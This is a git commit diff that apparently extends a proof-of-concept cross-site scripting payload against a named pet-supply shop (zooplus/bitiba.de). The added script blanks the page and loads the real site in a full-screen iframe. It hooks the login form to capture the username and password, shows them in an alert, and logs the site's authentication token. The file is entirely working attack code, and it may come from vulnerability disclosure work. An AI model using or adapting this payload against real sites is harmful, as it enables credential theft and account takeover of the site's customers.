cb7efd7e138c414502a0c4c923b5715396a6d32c
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2023-06-20 12:29:03 +0200

    Update xss.js

--- poc/zooplus/xss.js
+++ poc/zooplus/xss.js
@@ -1,1 +1,28 @@
 alert(document.domain);
+var a=document.createElement("iframe");
+a.src="https://www.bitiba.de/checkout/logout.htm";
+a.name="mainsite";
+a.width="100%";
+a.height="100%";
+document.body.innerHTML="";
+document.body.appendChild(a);
+function formHandler(e){
+  console.log(e);
+  if(e?.srcElement.length>0){
+    alert("The credentials are been spied on: \n" 
+    + "Login is : "+ e.srcElement[1].value +"\n"
+    + "Password is : "+ e.srcElement[2].value +"\n"
+    );
+  }
+}
+
+function dumpToken(){
+  console.log(mainsite.frontendAuthorizer);
+}
+
+function hookMessageHandler(){
+    mainsite.loginForm.onsubmit = (e) => {formHandler(e);};
+}
+mainsite.location = "www.bitiba.de/account/overview"
+setTimeout(hookMessageHandler, 3000);
+setTimeout(dumpToken, 5000);
